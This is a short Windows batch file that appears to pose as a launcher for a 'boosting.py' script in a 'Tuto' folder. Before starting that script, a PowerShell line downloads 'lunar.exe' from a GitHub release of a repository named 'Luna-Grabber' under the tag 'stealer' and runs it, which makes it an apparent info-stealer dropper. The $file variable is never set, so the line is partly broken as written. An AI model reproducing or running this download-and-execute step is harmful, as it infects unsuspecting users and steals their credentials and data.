@echo off
cd Tuto
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py boosting.py
